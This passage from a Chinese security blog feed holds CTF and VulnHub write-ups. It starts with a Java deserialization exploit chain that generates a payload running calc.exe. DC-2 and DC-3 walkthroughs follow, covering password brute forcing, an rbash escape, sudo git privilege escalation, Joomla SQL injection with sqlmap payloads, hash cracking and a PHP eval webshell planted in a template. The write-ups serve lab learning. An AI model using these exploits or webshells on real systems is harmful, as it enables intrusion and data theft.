\u0026amp;\u0026amp; year == 2021) { objectInputStream.readObject(); return \u0026#34;welcome bro.\u0026#34;; } return \u0026#34;welcome bro.\u0026#34;; } } ToStringBean类：\npackage com.ezgame.ctf.tools; import java.io.Serializable; /* loaded from: ezgadget.jar:BOOT-INF/classes/com/ezgame/ctf/tools/ToStringBean.class */ public class ToStringBean extends ClassLoader implements Serializable { private byte[] ClassByte; public String toString() { ToStringBean toStringBean = new ToStringBean(); Class clazz = toStringBean.defineClass((String) null, this.ClassByte, 0, this.ClassByte.length); try { clazz.newInstance(); return \u0026#34;enjoy it.\u0026#34;; } catch (IllegalAccessException e) { e.printStackTrace(); return \u0026#34;enjoy it.\u0026#34;; } catch (InstantiationException e2) { e2.printStackTrace(); return \u0026#34;enjoy it.\u0026#34;; } } } 通过/readobject传入base64编码的恶意序列化类，readObject调用ToStringBean类的toString方法，加载自定义恶意类，先构造恶意类evil：\nimport java.io.IOException; public class Evil { public Evil() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc.exe\u0026#34;); } } 生成恶意序列化字符串，注意将ToStringBean类放在com.ezgame.ctf.tools包下：\nimport com.ezgame.ctf.tools.ToStringBean; import java.io.*; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.Base64; import javax.management.BadAttributeValueExpException; public class Exploit { public static void main(String[] args) throws Exception{ // 构造恶意类 byte[] evilClassByte = Files.readAllBytes(Paths.get(\u0026#34;path\\\\to\\\\Evil.class\u0026#34;)); ToStringBean toStringBean = new ToStringBean(); Field classbyteField = toStringBean.getClass().getDeclaredField(\u0026#34;ClassByte\u0026#34;); classbyteField.setAccessible(true); classbyteField.set(toStringBean, evilClassByte); // BadAttributeValueExpException.readObject -\u0026gt; ToStringBean.ToString -\u0026gt; 弹计算器 BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(\u0026#34;test\u0026#34;); Field valField = badAttributeValueExpException.getClass().getDeclaredField(\u0026#34;val\u0026#34;); valField.setAccessible(true); valField.set(badAttributeValueExpException, toStringBean); // 反序列化条件 if (name.equals(\u0026#34;gadgets\u0026#34;) \u0026amp;\u0026amp; year == 2021) ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeUTF(\u0026#34;gadgets\u0026#34;); objectOutputStream.writeInt(2021); // 最后序列化恶意类 objectOutputStream.writeObject(badAttributeValueExpException); // 输出base64编码序列化结果 byte[] expByte = byteArrayOutputStream.toByteArray(); String base64ExpString = base64Encode(expByte); System.out.println(base64ExpString); // 测试 test(base64ExpString); } public static void test(String data) throws Exception{ byte[] b = base64Decode(data); InputStream inputStream = new ByteArrayInputStream(b); ObjectInputStream objectInputStream = new ObjectInputStream(inputStream); String name = objectInputStream.readUTF(); int year = objectInputStream.readInt(); if (name.equals(\u0026#34;gadgets\u0026#34;) \u0026amp;\u0026amp; year == 2021) { objectInputStream.readObject(); System.out.println(\u0026#34;Yes\u0026#34;); } System.out.println(\u0026#34;No\u0026#34;); } public static String base64Encode(byte[] bytes) { Base64.Encoder encoder = Base64.getEncoder(); return encoder.encodeToString(bytes); } public static byte[] base64Decode(String base64) { Base64.Decoder decoder = Base64.getDecoder(); return decoder.decode(base64); } } data传参base64字符串时注意要将特殊字符转义：\n","permalink":"https://blog.w8nn9z.top/posts/web/javaunserialize/","summary":"","title":"Java反序列化"},{"content":"vulnhub DC2 nmap扫描开放端口及服务：\n$ nmap 61.139.2.0/24 Nmap scan report for 61.139.2.135 Host is up (0.00060s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE 80/tcp open http 访问发现有域名解析不成功的问题，windows上可以修改C:\\Windows\\System32\\drivers\\etc\\hosts来配置域名解析，linux则是/etc/hosts：\n61.139.2.135 dc-2 访问web服务：\n访问：http://dc-2/index.php/flag/获取Flag1：\nFlag 1:\rYour usual wordlists probably won’t work, so instead, maybe you just need to be cewl.\rMore passwords is always better, but sometimes you just can’t win them all.\rLog in as one to see the next flag.\rIf you can’t find it, log in as another. 提示使用cewl来获取密码字典，从特定URL爬取关键字列表：\n$ cewl http://dc-2/ -w passwords.txt 由于网站是wordpress框架，利用wpscan枚举网站登录用户名：\nwpscan --url http://dc-2/ -e u #枚举用户名 [i] User(s) Identified: [+] admin | Found By: Rss Generator (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] jerry | Found By: Wp Json Api (Aggressive Detection) | - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Confirmed By: | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] tom | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) 再用wpscan爆破用户名和密码进行登录：\nwpscan --url http://dc-2/ -U username.txt -P passwords.txt [+] Performing password attack on Xmlrpc against 3 user/s [SUCCESS] - jerry / adipiscing [SUCCESS] - tom / parturient 访问wordpress登录界面wp-admin进行登录，跳转到了wp-login，Pages里找到Flag2：\nFlag 2:\rIf you can\u0026#39;t exploit WordPress and take a shortcut, there is another way.\rHope you found another entry point. 可能存在其他服务，再用nmap对该ip进行全面扫描：\n$ nmap -A -p 1-65535 61.139.2.135 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-25 12:41 CST Nmap scan report for dc-2 (61.139.2.135) Host is up (0.00036s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-generator: WordPress 4.7.10 |_http-server-header: Apache/2.4.10 (Debian) |_http-title: DC-2 \u0026amp;#8211; Just another WordPress site 7744/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0) | ssh-hostkey: | 1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA) | 2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA) | 256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA) |_ 256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.85 seconds 可以发现7744端口开启了ssh服务，指定端口爆破之前的用户名和密码：\n$ hydra -L username.txt -P passwords.txt ssh://61.139.2.135 -vV -s 7744 [7744][ssh] host: 61.139.2.135 login: tom password: parturient ssh登录后发现是rbash，限制了很多命令如cd，先用less查看flag3.txt：\nPoor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes. 再看一下PATH环境变量允许执行哪些命令：\ntom@DC-2:~$ echo $PATH /home/tom/usr/bin tom@DC-2:~$ ls /home/tom/usr/bin less ls scp vi 利用vi进行rbash逃逸：\n:set shell=/bin/bash\r:shell /etc/passwd：\ntom@DC-2:~$ /bin/cat /etc/passw /bin/cat: /etc/passw: No such file or directory tom@DC-2:~$ /bin/cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false Debian-exim:x:104:109::/var/spool/exim4:/bin/false messagebus:x:105:110::/var/run/dbus:/bin/false statd:x:106:65534::/var/lib/nfs:/bin/false sshd:x:107:65534::/var/run/sshd:/usr/sbin/nologin mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/false tom:x:1001:1001:Tom Cat,,,:/home/tom:/bin/rbash jerry:x:1002:1002:Jerry Mouse,,,:/home/jerry:/bin/bash 尝试su登录Jerry账户，使用之前wordpress的密码登录成功，发现flag4.txt：\njerry@DC-2:~$ cat flag4.txt Good to see that you\u0026#39;ve made it this far - but you\u0026#39;re not home yet. You still need to get the final flag (the only flag that really counts!!!). No hints here - you\u0026#39;re on your own now. :-) Go on - git outta here!!!! find没有找到suid权限文件，尝试sudo -l：\njerry@DC-2:~$ sudo -l Matching Defaults entries for jerry on DC-2: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jerry may run the following commands on DC-2: (root) NOPASSWD: /usr/bin/git git提权：\nsudo git help config 在命令模式的末行输入!/bin/bash或!\u0026#39;sh\u0026#39; final-flag.txt：\n# cat /root/final-flag.txt\r__ __ _ _ _ _ / / /\\ \\ \\___| | | __| | ___ _ __ ___ / \\\r\\ \\/ \\/ / _ \\ | | / _` |/ _ \\| \u0026#39;_ \\ / _ \\/ /\r\\ /\\ / __/ | | | (_| | (_) | | | | __/\\_/ \\/ \\/ \\___|_|_| \\__,_|\\___/|_| |_|\\___\\/ Congratulatons!!!\rA special thanks to all those who sent me tweets\rand provided me with feedback - it\u0026#39;s all greatly\rappreciated.\rIf you enjoyed this CTF, send me a tweet via @DCAU7. 参考资料：\nhttps://www.ddosi.org/cewl/\nhttps://www.freebuf.com/vuls/376922.html\nvulnhub DC3 nmap扫描开放端口及服务：\n$ nmap 61.139.2.0/24 Nmap scan report for 61.139.2.136 Host is up (0.00096s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE 80/tcp open http 全面扫描：\n$ nmap -A -p 1-65535 61.139.2.136 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-26 10:39 CST Nmap scan report for 61.139.2.136 Host is up (0.00096s latency). Not shown: 65534 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: Joomla! - Open Source Content Management |_http-title: Home |_http-server-header: Apache/2.4.18 (Ubuntu) 访问web服务：\n获取版本信息/administrator/manifests/files/joomla.xml：\n\u0026lt;extension version=\u0026#34;3.6\u0026#34; type=\u0026#34;file\u0026#34; method=\u0026#34;upgrade\u0026#34;\u0026gt; \u0026lt;name\u0026gt;files_joomla\u0026lt;/name\u0026gt; \u0026lt;author\u0026gt;Joomla! Project\u0026lt;/author\u0026gt; \u0026lt;authorEmail\u0026gt;admin@joomla.org\u0026lt;/authorEmail\u0026gt; \u0026lt;authorUrl\u0026gt;www.joomla.org\u0026lt;/authorUrl\u0026gt; \u0026lt;copyright\u0026gt; (C) 2005 - 2017 Open Source Matters. All rights reserved \u0026lt;/copyright\u0026gt; \u0026lt;license\u0026gt; GNU General Public License version 2 or later; see LICENSE.txt \u0026lt;/license\u0026gt; \u0026lt;version\u0026gt;3.7.0\u0026lt;/version\u0026gt; \u0026lt;creationDate\u0026gt;April 2017\u0026lt;/creationDate\u0026gt; \u0026lt;description\u0026gt;FILES_JOOMLA_XML_DESCRIPTION\u0026lt;/description\u0026gt; \u0026lt;scriptfile\u0026gt;administrator/components/com_admin/script.php\u0026lt;/scriptfile\u0026gt; \u0026lt;update\u0026gt; \u0026lt;schemas\u0026gt; \u0026lt;schemapath type=\u0026#34;mysql\u0026#34;\u0026gt; administrator/components/com_admin/sql/updates/mysql \u0026lt;/schemapath\u0026gt; \u0026lt;schemapath type=\u0026#34;sqlsrv\u0026#34;\u0026gt; administrator/components/com_admin/sql/updates/sqlazure \u0026lt;/schemapath\u0026gt; \u0026lt;schemapath type=\u0026#34;sqlazure\u0026#34;\u0026gt; administrator/components/com_admin/sql/updates/sqlazure \u0026lt;/schemapath\u0026gt; \u0026lt;schemapath type=\u0026#34;postgresql\u0026#34;\u0026gt; administrator/components/com_admin/sql/updates/postgresql \u0026lt;/schemapath\u0026gt; \u0026lt;/schemas\u0026gt; \u0026lt;/update\u0026gt; \u0026lt;fileset\u0026gt; \u0026lt;files\u0026gt; \u0026lt;folder\u0026gt;administrator\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;bin\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;cache\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;cli\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;components\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;images\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;includes\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;language\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;layouts\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;libraries\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;media\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;modules\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;plugins\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;templates\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;tmp\u0026lt;/folder\u0026gt; \u0026lt;file\u0026gt;htaccess.txt\u0026lt;/file\u0026gt; \u0026lt;file\u0026gt;web.config.txt\u0026lt;/file\u0026gt; \u0026lt;file\u0026gt;LICENSE.txt\u0026lt;/file\u0026gt; \u0026lt;file\u0026gt;README.txt\u0026lt;/file\u0026gt; \u0026lt;file\u0026gt;index.php\u0026lt;/file\u0026gt; \u0026lt;/files\u0026gt; \u0026lt;/fileset\u0026gt; \u0026lt;updateservers\u0026gt; \u0026lt;server name=\u0026#34;Joomla! Core\u0026#34; type=\u0026#34;collection\u0026#34;\u0026gt;https://update.joomla.org/core/list.xml\u0026lt;/server\u0026gt; \u0026lt;/updateservers\u0026gt; \u0026lt;/extension\u0026gt; Joomla 3.7.0 (CVE-2017-8917) 存在SQL注入漏洞，poc：\n/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml(1,concat(0x3e,user()),0)\r500 XPATH syntax error: \u0026#39;\u0026gt;root@localhost\u0026#39; 使用searchsploit查找漏洞利用方法：\n$ searchsploit joomla 3.7.0 ------------------------------------------------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------ --------------------------------- Joomla! 3.7.0 - \u0026#39;com_fields\u0026#39; SQL Injection | php/webapps/42033.txt Joomla! Component Easydiscuss \u0026lt; 4.0.21 - Cross-Site Scripting | php/webapps/43488.txt ------------------------------------------------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results $ cat /usr/share/exploitdb/exploits/php/webapps/42033.txt # Exploit Title: Joomla 3.7.0 - Sql Injection # Date: 05-19-2017 # Exploit Author: Mateus Lino # Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html # Vendor Homepage: https://www.joomla.org/ # Version: = 3.7.0 # Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux # CVE : - CVE-2017-8917 URL Vulnerable: http://localhost/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml%27 Using Sqlmap: $ sqlmap -u \u0026#34;http://localhost/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml\u0026#34; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] Parameter: list[fullordering] (GET) Type: boolean-based blind Title: Boolean-based blind - Parameter replace (DUAL) Payload: option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END) Type: error-based Title: MySQL \u0026gt;= 5.0 error-based - Parameter replace (FLOOR) Payload: option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) Type: AND/OR time-based blind Title: MySQL \u0026gt;= 5.0.12 time-based blind - Parameter replace (substraction) Payload: option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu) 利用sqlmap自动注入：\n$ sqlmap -u \u0026#34;http://61.139.2.136/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml\u0026#34; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] sqlmap identified the following injection point(s) with a total of 4381 HTTP(s) requests: --- Parameter: list[fullordering] (GET) Type: error-based Title: MySQL \u0026gt;= 5.1 error-based - Parameter replace (UPDATEXML) Payload: option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=(UPDATEXML(4878,CONCAT(0x2e,0x717a766b71,(SELECT (ELT(4878=4878,1))),0x7171717871),5669)) --- [11:05:03] [INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu 16.10 or 16.04 (yakkety or xenial) web application technology: Apache 2.4.18 back-end DBMS: MySQL \u0026gt;= 5.1 [11:05:03] [INFO] fetching database names [11:05:03] [INFO] retrieved: \u0026#39;information_schema\u0026#39; [11:05:03] [INFO] retrieved: \u0026#39;joomladb\u0026#39; [11:05:03] [INFO] retrieved: \u0026#39;mysql\u0026#39; [11:05:03] [INFO] retrieved: \u0026#39;performance_schema\u0026#39; [11:05:03] [INFO] retrieved: \u0026#39;sys\u0026#39; available databases [5]: [*] information_schema [*] joomladb [*] mysql [*] performance_schema [*] sys 获取joomladb下的表名：\n$ sqlmap -u \u0026#34;http://61.139.2.136/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml\u0026#34; --risk=3 --level=5 --random-agent -D \u0026#34;joomladb\u0026#34; --tables -p list[fullordering] Database: joomladb [76 tables] +---------------------+ | #__assets | | #__associations | | #__banner_clients | | #__banner_tracks | | #__banners | | #__bsms_admin | | #__bsms_books | | #__bsms_comments | | #__bsms_locations | | #__bsms_mediafiles | | #__bsms_message_typ | | #__bsms_podcast | | #__bsms_series | | #__bsms_servers | | #__bsms_studies | | #__bsms_studytopics | | #__bsms_teachers | | #__bsms_templatecod | | #__bsms_templates | | #__bsms_timeset | | #__bsms_topics | | #__bsms_update | | #__categories | | #__contact_details | | #__content_frontpag | | #__content_rating | | #__content_types | | #__content | | #__contentitem_tag_ | | #__core_log_searche | | #__extensions | | #__fields_categorie | | #__fields_groups | | #__fields_values | | #__fields | | #__finder_filters | | #__finder_links_ter | | #__finder_links | | #__finder_taxonomy_ | | #__finder_taxonomy | | #__finder_terms_com | | #__finder_terms | | #__finder_tokens_ag | | #__finder_tokens | | #__finder_types | | #__jbsbackup_timese | | #__jbspodcast_times | | #__languages | | #__menu_types | | #__menu | | #__messages_cfg | | #__messages | | #__modules_menu | | #__modules | | #__newsfeeds | | #__overrider | | #__postinstall_mess | | #__redirect_links | | #__schemas | | #__session | | #__tags | | #__template_styles | | #__ucm_base | | #__ucm_content | | #__ucm_history | | #__update_sites_ext | | #__update_sites | | #__updates | | #__user_keys | | #__user_notes | | #__user_profiles | | #__user_usergroup_m | | #__usergroups | | #__users | | #__utf8_conversion | | #__viewlevels | +---------------------+ 获取#__users表中的字段：\n$ sqlmap -u \u0026#34;http://61.139.2.136/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml\u0026#34; --risk=3 --level=5 --random-agent -D \u0026#34;joomladb\u0026#34; -T \u0026#34;#__users\u0026#34; --columns -p list[fullordering] Database: joomladb Table: #__users [6 columns] +----------+-------------+ | Column | Type | +----------+-------------+ | name | non-numeric | | email | non-numeric | | id | numeric | | params | non-numeric | | password | non-numeric | | username | non-numeric | +----------+-------------+ 获取字段内容：\n$ sqlmap -u \u0026#34;http://61.139.2.136/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml\u0026#34; --dbms mysql -D joomladb -T \u0026#39;#__users\u0026#39; -C id,name,password,username --dump Database: joomladb Table: #__users [1 entry] +-----+--------+--------------------------------------------------------------+----------+ | id | name | password | username | +-----+--------+--------------------------------------------------------------+----------+ | 629 | admin | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | admin | +-----+--------+--------------------------------------------------------------+----------+ 将password写入hash文件，利用john爆破hash：\n$ john hash Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 4 OpenMP threads Proceeding with single, rules:Single Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:/usr/share/john/password.lst snoopy (?) 1g 0:00:00:00 DONE 2/3 (2025-09-26 11:43) 5.263g/s 189.4p/s 189.4c/s 189.4C/s 123456..buster Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. 访问admin后台/administrator，成功登录，可以修改templates中的php代码，比如在index.php中加入一句话木马，注意写在安全检查之前：\n// 一句话木马 @eval($_REQUEST[1]); defined(\u0026#39;_JEXEC\u0026#39;) or die; // 如果不是通过框架访问则结束代码运行 用dirsearch扫描templates所在目录：\n[11:51:37] Starting: [11:51:38] 403 - 301B - /.htaccess.orig [11:51:38] 403 - 303B - /.htaccess.sample [11:51:38] 403 - 301B - /.htaccess.bak1 [11:51:38] 403 - 301B - /.htaccess_orig [11:51:38] 403 - 302B - /.htaccess_extra [11:51:38] 403 - 298B - /.ht_wsr.txt [11:51:38] 403 - 301B - /.htaccess.save [11:51:38] 403 - 299B - /.htaccessBAK [11:51:38] 403 - 299B - /.htaccess_sc [11:51:38] 403 - 300B - /.htaccessOLD2 [11:51:38] 403 - 291B - /.htm [11:51:38] 403 - 292B - /.html [11:51:38] 403 - 299B - /.htaccessOLD [11:51:38] 403 - 298B - /.httr-oauth [11:51:38] 403 - 301B - /.htpasswd_test [11:51:38] 403 - 297B - /.htpasswds [11:51:39] 403 - 291B - /.php [11:51:39] 403 - 292B - /.php3 [11:51:45] 301 - 320B - /administrator -\u0026gt; http://61.139.2.136/administrator/ [11:51:45] 200 - 31B - /administrator/cache/ [11:51:45] 200 - 2KB - /administrator/ [11:51:45] 200 - 534B - /administrator/includes/ [11:51:45] 301 - 325B - /administrator/logs -\u0026gt; http://61.139.2.136/administrator/logs/ [11:51:45] 200 - 31B - /administrator/logs/ [11:51:45] 200 - 2KB - /administrator/index.php [11:51:47] 301 - 310B - /bin -\u0026gt; http://61.139.2.136/bin/ [11:51:47] 200 - 31B - /bin/ [11:51:48] 301 - 312B - /cache -\u0026gt; http://61.139.2.136/cache/ [11:51:48] 200 - 31B - /cache/ [11:51:48] 200 - 31B - /cli/ [11:51:49] 301 - 317B - /components -\u0026gt; http://61.139.2.136/components/ [11:51:49] 200 - 31B - /components/ [11:51:49] 200 - 0B - /configuration.php [11:51:53] 200 - 1KB - /htaccess.txt [11:51:53] 200 - 31B - /images/ [11:51:53] 301 - 313B - /images -\u0026gt; http://61.139.2.136/images/ [11:51:53] 200 - 31B - /includes/ [11:51:53] 301 - 315B - /includes -\u0026gt; http://61.139.2.136/includes/ [11:51:53] 200 - 2KB - /index.php [11:51:53] 404 - 3KB - /index.php/login/ [11:51:54] 301 - 315B - /language -\u0026gt; http://61.139.2.136/language/ [11:51:54] 200 - 31B - /layouts/ [11:51:55] 301 - 316B - /libraries -\u0026gt; http://61.139.2.136/libraries/ [11:51:55] 200 - 31B - /libraries/ [11:51:55] 200 - 7KB - /LICENSE.txt [11:51:56] 301 - 312B - /media -\u0026gt; http://61.139.2.136/media/ [11:51:56] 200 - 31B - /media/ [11:51:56] 301 - 314B - /modules -\u0026gt; http://61.139.2.136/modules/ [11:51:57] 200 - 31B - /modules/ [11:51:59] 301 - 314B - /plugins -\u0026gt; http://61.139.2.136/plugins/ [11:51:59] 200 - 31B - /plugins/ [11:52:01] 200 - 2KB - /README.txt [11:52:01] 200 - 395B - /robots.txt.dist [11:52:02] 403 - 300B - /server-status [11:52:02] 403 - 301B - /server-status/ [11:52:04] 301 - 316B - /templates -\u0026gt; http://61.139.2.136/templates/ [11:52:04] 200 - 31B - /templates/ [11:52:04] 200 - 0B - /templates/beez3/ [11:52:04] 200 - 31B - /templates/index.html [11:52:04] 200 - 0B - /templates/protostar/ [11:52:04] 200 - 0B - /templates/system/ [11:52:05] 200 - 31B - /tmp/ [11:52:05] 301 - 310B - /tmp -\u0026gt; http://61.139.2.136/tmp/ [11:52:07] 200 - 567B - /web.config.txt 常规的提权方法没找到成功的，只能找内核漏洞了：\n$ uname -a Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 athlon i686 GNU/Linux 对应版本Ubuntu 16.04，同样使用searchsploit：\n$ searchsploit Ubuntu 16.04 ------------------------------------------------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------ --------------------------------- Apport 2.x (Ubuntu Desktop 12.10 \u0026lt; 16.04) - Local Code Execution | linux/local/40937.txt Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation | linux/local/40054.c Google Chrome (Fedora 25 / Ubuntu 16.04) - \u0026#39;tracker-extract\u0026#39; / \u0026#39;gnome-video-thumbnailer\u0026#39; + \u0026#39;totem\u0026#39; Drive-By Download | linux/local/40943.txt LightDM (Ubuntu 16.04/16.10) - \u0026#39;Guest Account\u0026#39; Local Privilege Escalation | linux/local/41923.txt Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7.3.1611) - \u0026#39;ldso_hwcap_64 Stac | linux_x86-64/local/42275.c Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - \u0026#39;ldso_dynamic Stack Clash\u0026#39; Local Privileg | linux_x86/local/42276.c Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps | linux/dos/39773.txt Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR \u0026amp; SMEP Bypass) Arbitrary File Read | linux/local/45175.c Linux Kernel 4.4 (Ubuntu 16.04) - \u0026#39;BPF\u0026#39; Local Privilege Escalation (Metasploit) | linux/local/40759.rb Linux Kernel 4.4 (Ubuntu 16.04) - \u0026#39;snd_timer_user_ccallback()\u0026#39; Kernel Pointer Leak | linux/dos/46529.c Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - \u0026#39;AF_PACKET\u0026#39; Race Condition Privilege Escalation | linux_x86-64/local/40871.c Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter \u0026#39;target_offset\u0026#39; Out-of-Bounds Privilege Escalation | linux_x86-64/local/40049.c Linux Kernel 4.4.0-21 \u0026lt; 4.4.0-51 (Ubuntu 14.04/16.04 x64) - \u0026#39;AF_PACKET\u0026#39; Race Condition Privilege Escalation | windows_x86-64/local/47170.c Linux Kernel 4.4.x (Ubuntu 16.04) - \u0026#39;double-fdput()\u0026#39; bpf(BPF_PROG_LOAD) Privilege Escalation | linux/local/39772.txt Linux Kernel 4.6.2 (Ubuntu 16.04.1) - \u0026#39;IP6T_SO_SET_REPLACE\u0026#39; Local Privilege Escalation | linux/local/40489.txt Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer | linux/dos/45919.c Linux Kernel \u0026lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation | linux/local/45010.c Linux Kernel \u0026lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation | linux/local/44298.c Linux Kernel \u0026lt; 4.4.0-21 (Ubuntu 16.04 x64) - \u0026#39;netfilter target_offset\u0026#39; Local Privilege Escalation | linux_x86-64/local/44300.c Linux Kernel \u0026lt; 4.4.0-83 / \u0026lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP) | linux/local/43418.c Linux Kernel \u0026lt; 4.4.0/ \u0026lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SME | linux/local/47169.c ------------------------------------------------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results $ cat /usr/share/exploitdb/exploits/linux/dos/39773.txt Source: 